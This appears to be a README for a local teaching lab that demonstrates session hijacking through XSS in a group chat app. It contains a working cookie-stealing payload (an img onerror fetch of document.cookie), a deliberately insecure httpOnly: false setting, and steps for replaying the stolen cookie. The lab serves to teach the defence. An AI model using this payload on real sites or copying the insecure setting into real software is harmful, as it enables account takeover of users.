# Session Hijacking Demo

This project demonstrates **session hijacking via XSS** in a group chat application.

## How It Works

1. The app uses `express-session` to track logged-in users via a session cookie.
2. The cookie is intentionally set with `httpOnly: false`, allowing JavaScript to read it via `document.cookie`.
3. An attacker injects an XSS payload that exfiltrates the victim's session cookie.
4. The attacker replays the stolen cookie in their own browser to impersonate the victim.

## Step-by-Step Demo

### 1. Start the server

```bash
npm start
```

### 2. Victim logs in

- Open `http://localhost:8080` in **Browser A** (the victim).
- Enter a username (e.g., `alice`) and click **Continue**.
- A session cookie (`connect.sid`) is now set in the browser.

### 3. Attacker sends an XSS payload

- Open `http://localhost:8080` in **Browser B** (the attacker).
- Log in as any user (e.g., `attacker`).
- Send this message in the chat:

```html
<img src=x onerror="fetch('/save?data='+document.cookie)">
```

This payload executes in every connected user's browser, including the victim's. It sends the victim's `document.cookie` (which contains `connect.sid`) to the `/save` endpoint, where it gets stored in the database.

### 4. Retrieve the stolen cookie

Check the server logs or the database for the exfiltrated cookie. You'll see something like:

```
QUERY { data: 'connect.sid=s%3A<session-id-here>...' }
```

### 5. Hijack the session

- Open a **new incognito/private window** (Browser C).
- Navigate to `http://localhost:8080`.
- Open **Developer Tools → Application → Cookies**.
- Manually set a cookie:
  - **Name:** `connect.sid`
  - **Value:** the stolen value (URL-decoded)
- Refresh the page.
- You are now logged in as `alice` — the session was hijacked!

### 6. Verify

- Visit `http://localhost:8080/me` in Browser C — it should return `{"username":"alice"}`.

## Key Endpoints

| Endpoint | Method | Description |
|---|---|---|
| `/login` | POST | Logs in a user (sets session) |
| `/me` | GET | Returns the current session's username |
| `/save?data=...` | GET | Exfiltration endpoint (stores data in DB) |
| `/clear-chat` | GET | Clears all chat messages |

## Why This Works

The session cookie is set **without `httpOnly`**, meaning JavaScript running in the page can access it via `document.cookie`. In a properly secured application, `httpOnly: true` would prevent this attack vector.
